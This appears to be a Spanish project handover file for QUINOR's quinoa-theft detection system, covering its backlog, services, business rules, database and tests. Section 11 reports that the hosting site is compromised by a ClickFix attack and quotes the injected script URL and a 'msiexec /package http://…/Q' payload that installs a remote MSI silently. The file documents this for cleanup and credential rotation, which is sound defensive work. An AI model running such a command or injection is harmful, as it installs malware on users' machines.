# QUINOR S.A.C. - Sistema de deteccion de sustraccion de quinua

> **Este archivo es lo primero que hay que leer al abrir una sesion nueva.**
> Contiene el estado real del desarrollo, las decisiones que ya se tomaron y por
> que, y lo que falta. Esta escrito para que una sesion que empieza de cero
> pueda continuar sin repetir trabajo ni contradecir lo ya construido.
>
> Ultima actualizacion: **23/09/2026**, al definir el MVP de 14 historias.

---

## 1. Para que existe el sistema

QUINOR S.A.C. exporta quinua en sacos de 50 kg dentro de contenedores. Sufre
hurtos y sustitucion de producto durante el despacho, y el problema se detecta
solo cuando el cliente final reclama, semanas despues. No hay trazabilidad en
tiempo real y existen puntos ciegos en toda la cadena.

La Alternativa 1 ataca el eslabon donde el producto todavia esta bajo control de
la empresa: **la rampa de carga**. La idea en una linea: cuando el peso real no
cuadra con el esperado, el sistema recorta el video de esa carga, cuenta los
sacos que cruzaron la linea, mira quien estuvo en la zona, pide a un modelo que
describa lo que paso, y avisa al supervisor antes de que el contenedor salga de
planta.

Dos casos que el sistema distingue a proposito, porque significan cosas
distintas:

- **Faltan sacos.** Bultos que no subieron al camion, o que salieron de la zona.
- **Los sacos cuadran y falta peso.** Sustitucion del contenido, que es el
  problema que mas duele y el mas dificil de ver a ojo.

### Documentos de referencia

| Archivo | Que contiene |
|---|---|
| `Documento_Funcional_Tecnico_Alternativa1_QUINOR.docx` | Especificacion funcional y tecnica, v1.2. Es la fuente de verdad de requisitos |
| `Backlog_Seguimiento_Alternativa1_QUINOR.xlsx` | Hoja `Historias`: las 14 del MVP. Hoja `Backlog`: las 6 postergadas. Estado, puntos y dependencias |
| `despacho/api/db/01_esquema.sql` | Fuente de verdad del modelo de datos |
| `despliegue/LEEME.md` | Como desplegar la base en el hosting |

Los apartados del documento se citan a lo largo del codigo (apartado 5.3 los
estados, 6.4 los componentes, 8 la seguridad, 9.2 la calidad del analisis). Esas
referencias son deliberadas: permiten volver del codigo al requisito.

---

## 2. Estado del backlog y alcance del MVP

**MVP definido el 23/09/2026: 14 historias, 51 de 68 pts. 11 DONE (43 pts), 3
por hacer (8 pts).** El MVP cierra el ciclo detectar, alertar, verificar y
decidir. El limite no es arbitrario: la salida del piloto (apartado 10.1) exige
menos de 20 % de falsos positivos, y la concordancia de severidad (apartado 2.4)
exige 85 %. Las dos cifras solo se pueden medir con el veredicto del supervisor
(HU-13), que arrastra a HU-12 y HU-11.

### Renumeracion del 23/09/2026

Para que la hoja `Historias` no tenga huecos se intercambiaron dos IDs. **El
codigo, los README, las pruebas y el esquema SQL aun usan la numeracion
antigua**: donde el codigo diga HU-15 se refiere a usuarios y tokens.

| Antes | Ahora | Historia | Hoja |
|---|---|---|---|
| HU-15 | **HU-14** | Usuarios, roles y tokens | Historias (MVP) |
| HU-14 | **HU-15** | Reportes PDF y Excel | Backlog |

Otros cambios del mismo dia en el Excel: HU-12 y HU-13 pasaron del Sprint 3 al
Sprint 4 (HU-12 dependia de HU-09, que es del Sprint 4), y se corrigio la columna
"Dependencia cruzada" de HU-03 y HU-16. La copia previa quedo en
`Backlog_Seguimiento_Alternativa1_QUINOR_antes_MVP.xlsx`.

### Hoja Historias: el MVP

| HU | Sprint | Categoria | Pts | Estado | Donde vive |
|---|---|---|---|---|---|
| HU-01 Lectura de bascula (Modbus) | 1 | Captura | 3 | **DONE** | `despacho/api` |
| HU-02 Orden de despacho del ERP | 1 | Captura | 3 | **DONE** | `despacho/api` |
| HU-03 Evento de discrepancia | 2 | Deteccion | 3 | **DONE** | `despacho/api` |
| HU-04 Tolerancias por producto | 1 | Configuracion | 2 | **DONE** | `despacho/api` |
| HU-05 Grabacion continua 72 h | 2 | Video | 5 | **DONE** | `despacho/grabador` |
| HU-06 Recorte del clip del evento | 2 | Video | 3 | **DONE** | api + grabador |
| HU-07 Conteo de sacos con YOLO | 3 | IA | 8 | **DONE** | `despacho/yolo` + grabador |
| HU-08 Personas en zona de carga | 4 | IA | 5 | **DONE** | `despacho/yolo` + grabador |
| HU-09 Descripcion y severidad (VLM) | 4 | IA | 5 | **DONE** | `despacho/vlm` + grabador |
| HU-10 Alerta por correo | 4 | Alertas | 3 | **DONE** | `despacho/notificaciones` |
| HU-11 Lista de eventos con filtros | 2 | Dashboard | 3 | NEW | pendiente |
| HU-12 Detalle del evento | 4 | Dashboard | 3 | PENDING | pendiente |
| HU-13 Clasificar evento | 4 | Dashboard | 2 | PENDING | pendiente |
| HU-14 Usuarios, roles y tokens (antes HU-15) | 1 | Seguridad | 3 | **DONE** | `despacho/api` |

### Hoja Backlog: postergadas fuera del MVP

| HU | Pts | Motivo |
|---|---|---|
| HU-15 Reportes PDF y Excel (antes HU-14) | 3 | Mide tendencias de semanas, no valida el MVP |
| HU-16 Auditoria consultable | 2 | Criterios 1 y 3 ya los cumple el motor; falta solo mostrarla |
| HU-17 Cola de tareas (Celery) | 3 | El bucle del grabador hace de worker; criterio 2 depende de HU-18 |
| HU-18 Panel de salud | 3 | Depende de HU-17; `GET /salud` ya registra los fallos |
| HU-19 Reentrenamiento YOLO | 5 | Espera el dataset real de QUINOR |
| HU-20 Exportar listado | 1 | Could, la menor prioridad |

**HU-11 es la siguiente.** Es NEW, no PENDING: su unica dependencia (HU-03) esta
DONE, y desbloquea HU-12 y HU-13, lo que falta del MVP (y en el Backlog, HU-15 y
HU-20). Buena parte de su trabajo ya esta hecho sin haberlo buscado: la vista
`v_evento_dashboard` existe, `GET /eventos` responde con filtros basicos, y la
pestana Eventos del dashboard ya los muestra.

**HU-17 sigue PENDING a peticion del usuario.** Sustituiria el sondeo por una
cola Celery. Mientras no llegue, el bucle del grabador hace de worker. El codigo
esta preparado: cuando HU-17 entre, lo unico que cambia es **quien llama** a
`clips.procesar_evento`, `conteo.contar`, `interpretacion.interpretar` y
`aviso.avisar`, no lo que hacen.

---

## 3. Arquitectura

Cinco servicios, cada uno en su contenedor, hablando por HTTP y compartiendo una
sola base de datos.

```
   Bascula Modbus          ERP/WMS              Camaras IP (RTSP)
        |                     |                        |
        v                     v                        v
   +--------------------------------------+   +--------------------------+
   |         ORQUESTADOR (api)            |   |       GRABADOR           |
   |  FastAPI, puerto 8000                |   |  proceso, sin HTTP       |
   |  HU-01 pesadas    HU-02 ordenes      |   |  HU-05 buffer 72 h       |
   |  HU-03 eventos    HU-04 tolerancias  |   |  HU-06 recorte del clip  |
   |  HU-14 usuarios y tokens             |   |  Orquesta 07, 08, 09, 10 |
   +--------------------------------------+   +--------------------------+
                    |                              |        |         |
                    |                              v        v         v
                    |                         +-------+ +------+ +--------------+
                    |                         | YOLO  | | VLM  | |NOTIFICACIONES|
                    |                         | :8002 | |:8003 | |    :8004     |
                    |                         |HU-07  | |HU-09 | |    HU-10     |
                    |                         |HU-08  | |      | |              |
                    |                         +-------+ +------+ +--------------+
                    |                              |        |         |
                    v                              v        v         v
             +---------------------------------------------------------+
             |   MariaDB (13 tablas, 2 vistas, 3 triggers)             |
             |   MinIO (clips y fotogramas, 12 meses)                  |
             +---------------------------------------------------------+
                    |
                    v
             Dashboard Streamlit :8501
```

### Por que esta partido asi

No es microservicios por moda. Cada corte responde a un motivo concreto:

**El grabador va aparte** porque grabar sin parar y atender peticiones HTTP son
dos trabajos distintos. Un fallo del grabador no puede llevarse por delante el
registro de pesadas de HU-01.

**YOLO va aparte** por tamano y por hardware: son gigas de PyTorch y en planta
necesita la GPU del RNF-06. El clip viaja por ruta de disco compartida, no por
HTTP, porque son cientos de megas por evento.

**VLM va aparte** por lo contrario: es el unico servicio del sistema que sale a
internet. Tenerlo solo deja esa salida en un sitio que se puede cortar, vigilar
y ponerle cuota.

**Notificaciones va aparte** por lo mismo que VLM: es el otro servicio que habla
con un servidor de fuera.

### Quien llama a quien

```
pesada (HU-01) -> evento si supera tolerancia (HU-03)
                     |
                     v
   grabador, en su bucle de sondeo:
     recorta el clip (HU-06)  --->  POST /analisis/yolo  (HU-07 + HU-08)
                                          |
                                          v
                              POST /analisis/vlm  (HU-09, solo si RN-03)
                                          |
                                          v
                              POST /notificaciones (HU-10, criterio 3)
```

La cadena entera corre en **una sola pasada** por evento, mientras el clip
todavia esta en disco local y los fotogramas en memoria. Bajarlos luego de MinIO
para lo mismo seria pagar dos veces el viaje. Ademas, cada paso tiene su pasada
de reintento en el bucle, para lo que fallo.

---

## 4. Tecnologias

| Capa | Tecnologia | Donde y por que |
|---|---|---|
| API | FastAPI 0.115 + uvicorn | Los cinco servicios HTTP |
| Validacion | Pydantic 2.10 | Contratos de entrada y salida |
| ORM | SQLAlchemy 2.0 | ORM en el orquestador; Core en los demas |
| Driver | PyMySQL 1.1 + cryptography | MariaDB y MySQL |
| Base de datos | MariaDB 11.4 (prod), MySQL 8 (verificado) | 13 tablas, 2 vistas, 3 triggers |
| Bascula | pymodbus 3.x | HU-01, Modbus TCP |
| ERP | httpx | HU-02, cliente REST con cache local |
| Video | ffmpeg (muxer segment y concat) | HU-05 y HU-06, con `-c copy`, sin reencodificar |
| RTSP | mediamtx | Servidor de camaras simuladas |
| Vision | ultralytics YOLO11n + ByteTrack | HU-07 conteo, HU-08 seguimiento |
| Imagen | OpenCV | Fotogramas clave (HU-09) |
| Modelo VLM | httpx contra Anthropic u OpenAI | HU-09, adaptador por proveedor |
| Correo | aiosmtplib | HU-10, apartado 6.4 |
| Almacen | MinIO (S3) | Clips y fotogramas, 12 meses |
| Dashboard | Streamlit + pandas | HU-04, HU-14 y detalle de eventos |
| Seguridad | passlib[bcrypt], tokens opacos | HU-14 |
| Observabilidad | structlog (JSON) | Los cinco servicios |
| Pruebas | pytest, pytest-cov, aiosmtpd, moto | Umbral 90 %, real 100 % |
| Contenedores | Docker Compose, 16 servicios | `despacho/api/docker-compose.yml` |

### Lo que se decidio NO usar

- **SDK de ningun proveedor de IA.** El cliente habla HTTP con un adaptador por
  proveedor. Los SDK cambian mas rapido que las APIs, y atarse a uno convertiria
  el cambio de proveedor en una reescritura en lugar de una variable de entorno.
- **OpenCV para grabar.** Reencodifica y consume CPU sin necesidad. ffmpeg con
  `-c copy` copia el flujo tal cual.
- **Slack, Teams y SMS.** Salieron del alcance de HU-10 el 18/09/2026.

---

## 5. Mapa del repositorio

```
quinor/
  CONTEXTO_DEL_PROYECTO.md          <- este archivo
  Documento_Funcional_Tecnico_Alternativa1_QUINOR.docx
  Backlog_Seguimiento_Alternativa1_QUINOR.xlsx
  despliegue/                       paquete para el hosting (ver seccion 9)
  despacho/
    api/                  orquestador: HU-01, 02, 03, 04, 06(marca), 14
      app/                main.py y un modulo por caso de uso
      db/01_esquema.sql   FUENTE DE VERDAD del modelo de datos
      dashboard/app.py    interfaz Streamlit
      sim/                simuladores de bascula (Modbus) y ERP
      tests/              una suite por modulo
      docker-compose.yml  los 16 servicios del entorno
    grabador/             HU-05, 06, y orquesta 07, 08, 09, 10
      app/grabador.py     bucle principal y supervisor de ffmpeg
      app/clips.py        caso de uso del clip
      app/conteo.py       llama a YOLO y escribe el conteo
      app/interpretacion.py  llama al VLM y escribe severidad
      app/aviso.py        llama a notificaciones (HU-10)
      sim/camara_sim.py   camara simulada sobre RTSP
    yolo/                 HU-07 conteo, HU-08 personas, fotogramas de HU-09
      modelos/sacos.pt    modelo entrenado (mAP50 0.994)
      sim/rampa_sim.py    generador de video sintetico
      sim/entrenar.py     entrenamiento
      sim/validar.py      mide el criterio 2 de HU-07
    vlm/                  HU-09
      app/severidad.py    RN-04, la regla que manda
      app/invocacion.py   RN-03, la puerta que controla el costo
      sim/vlm_stub.py     proveedor de mentira, por HTTP de verdad
    notificaciones/       HU-10
      app/destinatarios.py  criterio 1: quien recibe cada nivel
      app/plantilla.py      criterio 2: que dice el correo
      app/correo.py         envio con reintentos
```

Los cinco servicios comparten la misma disposicion, copiada del ejemplo
`quinor/blockchain/api`: fabrica de aplicacion (`create_app` o `crear_grabador`),
configuracion inyectada por parametro, `app/` con el codigo, `tests/` con una
suite por modulo, `sim/` con los simuladores, y `pytest.ini` con el umbral.

---

## 6. Convenciones que hay que respetar

Si una sesion nueva no lee nada mas de este archivo, que lea esto.

1. **El esquema es la fuente de verdad.** `despacho/api/db/01_esquema.sql`. Solo
   el orquestador define tablas. Los demas servicios son invitados: declaran las
   columnas que usan con SQLAlchemy Core, no con modelos ORM, justamente para
   que se note quien manda.

2. **La configuracion se inyecta, no se lee al importar.** Cada servicio tiene
   un `Ajustes` inmutable que la fabrica construye una vez. Ningun modulo llama a
   `os.environ` por su cuenta. Esto es lo que permite probar sin un entorno.

3. **Ninguna clave en el codigo** (apartado 8). Variables de entorno o secretos
   de Docker. La contrasena SMTP ni siquiera aparece al imprimir los ajustes.

4. **Las pruebas corren contra cosas reales.** MySQL y MariaDB reales, ffmpeg
   real, servidor RTSP real, S3 real (moto), SMTP real (aiosmtpd), servicios de
   mentira pero por HTTP de verdad. Un mock demuestra que se llamo a una
   funcion, que es lo que no falla nunca.

5. **Cobertura minima 90 %.** Hoy los cinco servicios estan en 100 %.

6. **RN-08 no se negocia.** Ni identificacion facial, ni datos biometricos. De
   cada persona se guardan un numero temporal valido solo dentro de ese clip,
   dos fotogramas y unos segundos. Hay pruebas que vigilan la **forma** de los
   datos, de modo que anadir un recorte de imagen rompa la suite antes de que
   eso salga de la red interna.

7. **NULL no es cero.** Se repite en todo el codigo: `sacos_contados` en NULL
   significa que el clip no se analizo, no que el camion iba vacio.
   `personal_anomalo` en NULL significa que no se miro, no que estaba bien.
   `segundos_desde_analisis` en NULL significa que no se pudo medir, y fingir un
   cero daria por cumplido el criterio 3 sin haberlo comprobado.

8. **Un fallo se registra, no se esconde.** Todo lo que sale mal deja fila en
   `auditoria` o en la tabla que corresponda, y se ve en el dashboard.

9. **Los comentarios explican el porque, no el que.** El codigo ya dice lo que
   hace. Los comentarios dicen por que se eligio eso y que pasaria con la
   alternativa. Mantener ese estilo.

10. **Ante una ambiguedad, preguntar.** Instruccion explicita del proyecto: si
    falta informacion, detenerse y preguntar antes de seguir.

---

## 7. Reglas de negocio vigentes

| Regla | Que dice | Donde vive |
|---|---|---|
| RN-01 | Tolerancia por producto en kg y en %, manda la mas restrictiva | `api/app/configuracion.py` |
| RN-02 | Sin orden valida no hay evento, hay incidencia de integracion | `api/app/eventos.py` |
| RN-03 | El VLM se invoca solo si YOLO confirma diferencia o personal anomalo | `vlm/app/invocacion.py` |
| RN-04 | Alta: 2+ sacos o sacos saliendo. Media: 1 saco o personal anomalo. Baja: el resto | `vlm/app/severidad.py` |
| RN-05 | Cambiar el estado de un evento exige comentario | HU-13, pendiente |
| RN-06 | Un Confirmado no vuelve a Pendiente | trigger `trg_evento_no_reabrir` |
| RN-07 | Video 72 h en buffer, clips 12 meses | `grabador/app/retencion.py` |
| RN-08 | Sin identificacion facial ni biometria | `yolo/app/personas.py` y el esquema |

**La severidad sale de la RN-04, no del modelo.** Es la decision de diseno mas
importante de HU-09. Una alerta de madrugada y el orden de la cola de revision no
pueden depender de la temperatura de un modelo. "Alta porque la diferencia fue de
3 sacos" se puede comprobar; "Alta porque el modelo lo dijo" no. La del modelo se
guarda aparte como `severidad_ia`, y de comparar las dos sale la concordancia
semanal del apartado 9.2.

---

## 8. Estados y flujo del evento

Estados del apartado 5.3:

```
   pesada fuera de tolerancia
            |
            v
      [pendiente] ------- sin video en el buffer -----> [sin_clip]
            |
            | el VLM agoto sus 3 reintentos
            v
   [pendiente_analisis] --- reintento con exito ---> [pendiente]
            |
            | un supervisor lo abre (HU-13)
            v
      [en_revision]
         /        \
        v          v
  [confirmado]  [falso_positivo]
        |
        +--- RN-06: de aqui no se vuelve (trigger en el motor)
```

Un caso que un supervisor ya abrio o cerro **no lo toca ningun proceso
automatico**. Un analisis que falla tarde no puede devolver a la cola un caso en
revision.

---

## 9. Base de datos y despliegue

**13 tablas:** `usuario`, `api_token`, `orden_despacho`, `pesada`, `carga`,
`configuracion`, `auditoria`, `salud_componente`, `evento`, `persona_en_evento`,
`notificacion`, `veredicto`, `modelo_version`.

**2 vistas:** `v_salud_actual` (ultimo estado por componente),
`v_evento_dashboard` (lo que consumira HU-11).

**3 triggers:** `trg_evento_no_reabrir` (RN-06), `trg_auditoria_no_update` y
`trg_auditoria_no_delete` (HU-16). Las reglas viven en el motor y no solo en la
aplicacion, de modo que ni un script suelto pueda saltarselas.

### Servidor de produccion

| Dato | Valor |
|---|---|
| Host | `vallesol.pe` |
| Base | `vallesol_yolo` |
| Usuario | `vallesol_user_yolo` |
| Motor | MariaDB 11.4.13 |

```
DATABASE_URL=mysql+pymysql://vallesol_user_yolo:CLAVE@vallesol.pe:3306/vallesol_yolo?charset=utf8mb4
```

Si la clave lleva `[` o `]`, hay que codificarlos como `%5B` y `%5D`.

### Como desplegar

La carpeta `despliegue/` tiene el paquete listo y su `LEEME.md`. Orden:
diagnostico, esquema, triggers, datos demo (opcional), verificacion. Desde
PowerShell:

```powershell
cd C:\proyectos\PI1\quinor\despliegue
powershell -ExecutionPolicy Bypass -File .\desplegar.ps1 -SoloDiagnostico
```

**El despliegue en el servidor esta PENDIENTE**, por el asunto de seguridad de
la seccion 11.

### Trampa de compatibilidad, ya resuelta

El esquema fijaba `utf8mb4_0900_ai_ci`, que **solo existe en MySQL 8**. En
MariaDB moria en la linea 60 con `ERROR 1273: Unknown collation`, antes de crear
la primera tabla. Ahora no se fija ninguna colacion y se hereda la del servidor.
Ademas, desde MariaDB 11.4.2 la colacion por defecto es `utf8mb4_uca1400_ai_ci`,
otra mas. Los scripts de verificacion avisan si quedan varias mezcladas, porque
eso rompe el primer JOIN que compare textos.

**Regla para el futuro: no fijar colaciones.** Y si hace falta un upsert, usar
`VALUES()` dentro de `ON DUPLICATE KEY UPDATE`, que es lo unico que aceptan los
dos motores.

---

## 10. Pruebas: 1220 en total, 100 % de cobertura

| Servicio | Pruebas | Cobertura | Contra que corre |
|---|---|---|---|
| `api` | 390 | 100 % | MySQL y MariaDB reales, Modbus en proceso, ERP con respx |
| `grabador` | 279 | 100 % | MySQL, ffmpeg, RTSP mediamtx, S3, tres servicios HTTP falsos |
| `yolo` | 222 | 100 % | Modelo entrenado real, video real generado |
| `vlm` | 185 | 100 % | Stub que habla el dialecto del proveedor por HTTP |
| `notificaciones` | 144 | 100 % | MySQL y un servidor SMTP real (aiosmtpd) |

Las tres suites que usan base de datos corren verdes en **MySQL 8.0.46 y en
MariaDB 10.11.14**.

```bash
# En cada servicio
TEST_DATABASE_URL=mysql+pymysql://usuario:clave@127.0.0.1:3306/quinor_test pytest
# El grabador necesita ademas:
MEDIAMTX_BIN=/ruta/a/mediamtx
```

**Las suites NO deben apuntar al servidor real.** Su `conftest.py` hace
`DROP DATABASE` y `TRUNCATE` en cada prueba, por diseno.

### Lo que las pruebas encontraron, y que conviene no repetir

- **HU-07, el bug mas caro.** El conteo daba cero en las ocho cargas de
  validacion. El detector veia los sacos perfectamente (mAP50 0.994); era
  ByteTrack, que asocia por solapamiento: con `YOLO_FRAME_STRIDE=2` un saco
  avanzaba mas que su propio ancho entre fotogramas mirados y nunca recibia
  identificador. El valor por defecto paso a 1, y ademas el fallo dejo de ser
  silencioso: si el detector ve objetos y el rastreador no sigue ninguno, la
  respuesta trae un aviso. Sin eso, un stride mal puesto devuelve cero y parece
  un camion sin cargar, que es justo la conclusion que mandaria a alguien a la
  rampa por nada.
- **Dos pruebas fragiles por fecha**, que pasaban hoy y fallarian en una semana.
  Ahora generan sus marcas de tiempo relativas al momento de correr.
- **La colacion de MySQL 8** en el esquema y en tres `conftest.py`.

---

## 11. Asunto de seguridad abierto (18/09/2026)

**El sitio `vallesol.pe` esta comprometido.** Sirve una falsa verificacion de
Cloudflare que pide al visitante pulsar Win+R, Ctrl+V y Enter. Eso ejecuta lo
que el atacante puso en el portapapeles. Es el ataque ClickFix.

- Inyeccion: `<script src="https://trackerredirect.online/embed.js?v=19">` en el
  `<head>` del WordPress, con dominios de respaldo `campaigntracker.icu`, `.run`
  y `.top`.
- Payload observado: `msiexec /package http://murielle22.com/... /Q`, que
  instala un MSI remoto en silencio, ofuscado con Unicode y homoglifos cirilicos.
- En el equipo de desarrollo llego a ejecutarse dos veces el 18/09 a las 21:17 y
  21:18. **Windows Defender lo bloqueo**: no hay eventos de Windows Installer de
  esa hora, ni programas nuevos, ni tareas programadas, ni rastro DNS.

**Antes de desplegar la base conviene:** limpiar la inyeccion en WordPress,
revisar los administradores de WordPress, y rotar credenciales de cPanel, FTP,
WordPress, correo y base de datos. Quien inyecto el script tuvo acceso al mismo
hosting donde vive `vallesol_yolo`, y el `wp-config.php` esta ahi.

---

## 12. Lo que falta, con lo que hay que saber de cada cosa

**HU-11, lista de eventos con filtros.** La siguiente. Su criterio 2 exige
responder en 2 s. Ya existen `v_evento_dashboard`, el indice
`ix_evento_estado_creado` que sostiene el filtro por defecto (pendientes de los
ultimos 7 dias), y `GET /eventos` con filtros basicos.

**HU-12, detalle del evento.** Su criterio 3 pide mostrar el fotograma de la
anomalia, y eso **ya esta resuelto**: HU-09 extrae los fotogramas clave y los
guarda en MinIO junto al clip, y `evento.fotogramas_clave` tiene sus URLs.

**HU-13, clasificar.** Aqui entra la RN-05 (comentario obligatorio) y se escribe
en `veredicto`. El trigger de RN-06 ya protege el retroceso.

**HU-17, cola de tareas (hoja Backlog, fuera del MVP).** Redis ya esta en el compose. El codigo esta preparado
para que solo cambie quien llama.

**HU-19, reentrenamiento (hoja Backlog, fuera del MVP).** `yolo/sim/entrenar.py` y `validar.py` ya existen. La
tabla `modelo_version` tambien. Falta el dataset de planta: lo que hay es
sintetico, y el reporte de validacion lo dice con todas las letras.

### Pendientes que dependen de QUINOR, no del desarrollo

1. **Clave de un proveedor de vision-lenguaje** (Anthropic u OpenAI). Todo esta
   probado contra un stub que habla el mismo dialecto.
2. **Datos del relay SMTP corporativo.** Probado contra mailpit y contra un
   servidor SMTP real de pruebas.
3. **Dataset de sacos reales de yute** para HU-19. El modelo actual se entreno
   con video sintetico.
4. **Acceso a planta** para las camaras y la bascula reales.

---

## 13. Como trabajar en la siguiente sesion

1. Leer este archivo.
2. Leer el `README.md` del servicio que se vaya a tocar. Cada uno explica sus
   decisiones y sus trampas.
3. Mirar el `reporte_coverage.txt` de ese servicio: dice contra que corre la
   suite y que encontro.
4. Confirmar el estado en el Excel, hoja `Historias`. La columna Estado es la
   que manda, y el Resumen se recalcula solo.
5. Al terminar una historia: actualizar el Excel (Estado a DONE, Avance a 1, y
   las observaciones con lo aprendido), el `reporte_coverage.txt`, el README del
   servicio, y **este archivo**.

### Como pedir el trabajo

El proyecto viene funcionando con un patron que conviene mantener: **una
historia por sesion**, con el criterio de aceptacion a la vista y verificacion de
punta a punta antes de darla por cerrada. Las historias se cerraron ejecutando el
sistema de verdad, no solo pasando pruebas unitarias: modelo entrenado sobre
video real, correo llegando a un buzon real, capturas del dashboard.

### El entorno de desarrollo

```bash
cd despacho/api
cp .env.example .env     # y rellenar
docker compose up -d
```

16 servicios, entre ellos los simuladores que sustituyen a la planta: bascula
Modbus, ERP falso, dos camaras publicando por RTSP, MinIO, mailpit en
`localhost:8025` para leer los correos, y el stub del proveedor de IA.

La base del compose es **MariaDB 11.4**, el mismo motor del hosting. Se cambio
desde MySQL 8.4 el 19/09/2026, despues de que la diferencia de colaciones
demostrara que desarrollar contra un motor y desplegar en otro esconde problemas
hasta el peor momento.

---

## 14. Glosario rapido

| Termino | Que es |
|---|---|
| Evento | Discrepancia entre peso real y esperado que supero la tolerancia |
| Clip | Recorte de video de la ventana de esa carga, en MinIO |
| Buffer | Video continuo de las ultimas 72 h, en disco local |
| Fotograma clave | Imagen elegida por lo que ocurre en ella (saco saliente, pico de personas) |
| Severidad | Alta, Media o Baja segun RN-04. La calcula una regla, no el modelo |
| `severidad_ia` | La que propuso el modelo. Se guarda para medir concordancia |
| Id temporal | Numero que el rastreador da a una persona **dentro de un clip**. No identifica a nadie |
| Sacos salientes | Sacos que cruzan la linea hacia fuera del camion. Senal fuerte de hurto |
